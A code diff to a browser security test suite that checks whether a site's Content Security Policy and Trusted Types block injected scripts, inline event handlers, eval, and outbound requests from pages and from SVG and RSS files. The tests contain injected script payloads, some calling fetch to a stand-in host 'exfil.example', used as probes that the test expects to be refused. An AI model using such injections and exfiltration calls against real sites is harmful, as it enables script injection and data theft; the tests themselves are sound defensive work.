@@ -74,32 +74,40 @@ test('pages refuse unapproved scripts, event handlers, eval and HTML strings', a
   await page.route('**/*', async (route) => {
     if (route.request().resourceType() !== 'document') return route.fallback();
     const original = await route.fetch();
-    const html = (await original.text()).replace('</body>', [
+    const body = (await original.text()).replace(/<meta http-equiv="refresh"[^>]*>/i, '');
+    const injection = [
       '<script>document.documentElement.dataset.probeInline="ran"</script>',
       '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.documentElement.dataset.probeHandler=\'ran\'">',
-      '</body>',
-    ].join(''));
+    ].join('');
+    const html = body.includes('</body>') ? body.replace('</body>', `${injection}</body>`) : `${body}${injection}`;
     await route.fulfill({ response: original, body: html });
   });
 
-  for (const path of ['/', '/contact/', '/field-notes/', '/no-such-page-security/']) {
+  for (const path of ['/', '/contact/', '/field-notes/', '/services.html/index.html', '/no-such-page-security/']) {
     await page.goto(path);
-    await expect(page.locator('html')).toHaveAttribute('data-sink-probe', /./);
+    // A redirect stub has no main.js locally (and 301s to /services/ live), so
+    // only assert the DOM-sink probe when main.js ran on the landed page.
+    const hasMain = (await page.locator('script[src*="/assets/js/main.js"]').count()) > 0;
+    if (hasMain) await expect(page.locator('html')).toHaveAttribute('data-sink-probe', /./);
     // Violation events are queued by the browser, after script execution.
     await page.waitForTimeout(100);
     const result = await page.evaluate(() => ({
       inline: document.documentElement.dataset.probeInline === 'ran',
       handler: document.documentElement.dataset.probeHandler === 'ran',
       eval: document.documentElement.dataset.probeEval === 'ran',
-      sinks: JSON.parse(document.documentElement.dataset.sinkProbe ?? '{}') as Record<string, string>,
+      sinks: document.documentElement.dataset.sinkProbe
+        ? (JSON.parse(document.documentElement.dataset.sinkProbe) as Record<string, string>)
+        : null,
     }));
-    expect(result, path).toEqual({ inline: false, handler: false, eval: false, sinks: REFUSED });
+    expect(result, path).toEqual({ inline: false, handler: false, eval: false, sinks: hasMain ? REFUSED : null });
     // Eval of a string is a Trusted Types sink too, refused before script-src
     // (which has no 'unsafe-eval' either; tests/csp.test.ts) is consulted.
     const directives = new Set((await violations()).map((v) => v.split(' ')[0]));
-    expect([...directives].sort(), path).toEqual([
-      'require-trusted-types-for', 'script-src-attr', 'script-src-elem', 'trusted-types',
-    ]);
+    expect([...directives].sort(), path).toEqual(
+      hasMain
+        ? ['require-trusted-types-for', 'script-src-attr', 'script-src-elem', 'trusted-types']
+        : ['img-src', 'script-src-attr', 'script-src-elem'],
+    );
   }
 });
 
@@ -144,6 +152,39 @@ test('pages cannot send data to any other origin', async ({ page }) => {
     await page.waitForTimeout(300);
     const refused = (await violations()).filter((v) => v.includes('https://exfil.example')).map((v) => v.split(' ')[0]);
     expect([...new Set(refused)].sort(), path).toEqual(['connect-src', 'frame-src', 'img-src']);
+  }
+  expect(leaked).toEqual([]);
+});
+
+// SVG and XML are active markup formats in browsers when opened directly and
+// carry no <meta> tag; in production the edge Worker stamps default-src 'none'
+// and Trusted Types on them. Local preview has no Worker in front (covered by
+// tests/edge-worker.test.ts), so this browser probe runs against JOURNEY_URL.
+test('active SVG and XML endpoints refuse injected scripts and outbound requests', async ({ page }) => {
+  test.skip(!process.env.JOURNEY_URL, 'edge Worker header is served on the live/preview-worker origin');
+  const leaked: string[] = [];
+  await page.route('**/exfil.example/**', (route) => {
+    leaked.push(route.request().url());
+    return route.fulfill({ status: 204 });
+  });
+  await page.route('**/*', async (route) => {
+    const url = new URL(route.request().url());
+    if (url.pathname !== '/assets/images/logo.svg' && url.pathname !== '/field-notes/rss.xml') {
+      return route.fallback();
+    }
+    const original = await route.fetch();
+    const text = await original.text();
+    const body = url.pathname.endsWith('.svg')
+      ? text.replace('</svg>', '<script>document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/svg",{mode:"no-cors"}).catch(()=>{})</script></svg>')
+      : text.replace('</rss>', '<script xmlns="http://www.w3.org/1999/xhtml">document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/xml",{mode:"no-cors"}).catch(()=>{})</script></rss>');
+    return route.fulfill({ response: original, body });
+  });
+
+  for (const path of ['/assets/images/logo.svg', '/field-notes/rss.xml']) {
+    await page.goto(path);
+    await page.waitForTimeout(150);
+    const ran = await page.evaluate(() => document.documentElement.getAttribute('data-ran'));
+    expect(ran, path).toBeNull();
   }
   expect(leaked).toEqual([]);
 });
